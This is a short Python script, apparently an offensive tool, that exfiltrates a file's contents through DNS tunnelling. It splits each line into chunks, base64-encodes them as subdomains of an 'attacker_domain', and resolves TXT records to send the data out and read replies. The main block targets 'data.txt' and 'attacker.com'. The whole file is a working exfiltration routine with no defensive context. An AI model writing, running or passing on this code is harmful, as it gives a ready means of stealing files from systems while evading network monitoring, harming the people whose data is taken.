
import base64
import dns.resolver

def chunk_string(s: str, size: int):
    return [s[i:i+size] for i in range(0, len(s), size)]

def tunnel_file(file_path: str, attacker_domain: str): 

    payload_chunk_size = 30

    with open(file_path) as f: 
        for line in f: 
            chunked_string = chunk_string(line, payload_chunk_size)

            for payload in chunked_string: 
                encoded = base64.urlsafe_b64encode(payload.encode()).decode().strip("=")

                domain = f"{encoded}.{attacker_domain}"
                answers = dns.resolver.resolve(domain, "TXT")

                for r in answers:
                    response = r.strings[0].decode()
                    decoded = base64.urlsafe_b64decode(response + "==").decode()
                    print(decoded)



if __name__ == "__main__": 
    tunnel_file("data.txt", "attacker.com")
